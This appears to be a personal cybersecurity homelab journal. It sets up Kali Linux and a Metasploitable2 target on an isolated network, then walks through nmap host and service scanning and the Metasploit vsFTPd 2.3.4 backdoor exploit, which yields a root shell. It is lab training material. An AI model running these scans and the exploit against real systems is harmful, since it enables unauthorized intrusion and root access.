# Homelab Blueprint & Learning Journal

This document tracks the creation, evolution, and exercises performed in my self-hosted cybersecurity homelab. It includes setup steps, hands-on experiments, troubleshooting, and takeaways from each phase.

---

## Table of Contents

- [Phase 1 – Core Components](#phase-1--core-components)
- [Phase 2 – Network Discovery](#phase-2--network-discovery)
- [Phase 3 – Initial Exploitation](#phase-3--initial-exploitation-with-metasploit)
- [Next Up](#next-up)

---

## Phase 1 - Core Components

For this first phase we'll just be installing the proper components to this lab.

- Downloaded **VMware Workstation**
- Installed **Kali Linux (Attacker)**
- Installed **Metasploitable2 (Target)**
- Configured both VMs to run on **Host-Only networking** for isolation and safety

---
## Phase 2 - Identifying the Target Machine (Network Discovery)

After both the attacker (Kali Linux) and target (Metasploitable2) virtual machines are running, the first step is to locate the IP address of the vulnerable machine so that scanning and testing can begin.

**Step 1**: Ensure both VM's are running

**Step 2**: Open command prompt on the Kali Linux VM and identify the local IP address and subnet of your Kali box **(e.g., 192.168.56.x)**.

**Step 3**: Scan the subnet to identify other live hosts (including the vulnerable box): ```nmap -sn 192.168.56.0/24```


**Step 4**: Once the Metasploitable2 IP is located, run a basic port scan: ```nmap [target_ip]```


**Step 5**: To identify running services and their versions, use the following: ```nmap -sV [target_ip]```. This provides more actionable detail for later exploitation or analysis.


At this stage, the vulnerable system has been identified and its services have been enumerated. This completes the initial reconnaissance phase. Next, we’ll begin exploring exploitation techniques using Metasploit.

---
## Phase 3 – Initial Exploitation with Metasploit

With our initial reconnaissance complete and services identified, it's time to attempt exploitation. In this phase, we’ll use Metasploit to exploit a known vulnerability in the vsFTPd service running on port 21 of the target machine.


**Step 1**: Identify a Target Service. From our earlier nmap -sV results, we found that port 21 is open and running vsFTPd (version 2.3.4), which is known to have a backdoor vulnerability.

**Step 2**: Launch Metasploit Framework through the console with the following command: ```msfconsole```

**Step 3**: Search for a Matching Exploit. Inside the Metasploit console: ```search vsftpd```

**Step 4**: Load the Exploit Module, select the correct exploit for this vulnerability: ```use exploit/unix/ftp/vsftpd_234_backdoor```

**Step 5**: Set Target IP Address. Replace [target_ip] with the actual IP of your Metasploitable2 VM: ```set RHOSTS [target_ip]```

**Step 6**: Run the Exploit: ```exploit```

If successful, this exploit spawns a root shell. You now have unauthorized access to the target system—this is for educational purposes only and should never be done on unauthorized networks.

## Next Up
- Configuring Splunk